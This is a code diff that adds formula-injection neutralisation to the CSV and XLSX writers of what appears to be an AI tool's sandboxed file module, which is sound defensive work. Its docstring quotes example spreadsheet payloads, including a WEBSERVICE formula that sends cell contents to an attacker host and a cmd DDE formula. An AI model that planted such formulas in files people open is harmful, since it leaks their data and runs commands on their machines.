@@ -70,6 +70,24 @@ def _safe_path(sandbox, user_path: str) -> Path:
     return candidate
 
 
+# Characters a spreadsheet app treats as the start of a formula.
+_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _neutralize_formula(value: Any) -> Any:
+    """Defang a CSV/XLSX formula-injection cell.
+
+    A model-supplied string cell beginning with ``=``, ``+``, ``-``, ``@``, TAB
+    or CR is executed as a formula when the file is opened in Excel / Sheets
+    (``=HYPERLINK(...)``, ``=WEBSERVICE("http://attacker/?"&A1)``,
+    ``=cmd|'/c ...'``). Prefixing a single quote makes the app render it as
+    literal text. Non-string cells (numbers) are left untouched.
+    """
+    if isinstance(value, str) and value[:1] in _FORMULA_TRIGGERS:
+        return "'" + value
+    return value
+
+
 # ---- CSV --------------------------------------------------------------------
 
 def _csv_read(path: Path, limit: int) -> list[list]:
@@ -80,7 +98,9 @@ def _csv_read(path: Path, limit: int) -> list[list]:
 def _csv_write(path: Path, rows: list[list]) -> None:
     path.parent.mkdir(parents=True, exist_ok=True)
     with path.open("w", newline="", encoding="utf-8") as f:
-        _csv.writer(f).writerows(rows)
+        _csv.writer(f).writerows(
+            [_neutralize_formula(c) for c in row] for row in rows
+        )
 
 
 # ---- XLSX -------------------------------------------------------------------
@@ -104,7 +124,7 @@ def _xlsx_write(path: Path, rows: list[list], sheet: str | None) -> None:
     if sheet:
         ws.title = sheet
     for row in rows:
-        ws.append(list(row))
+        ws.append([_neutralize_formula(c) for c in row])
     wb.save(path)
 
 
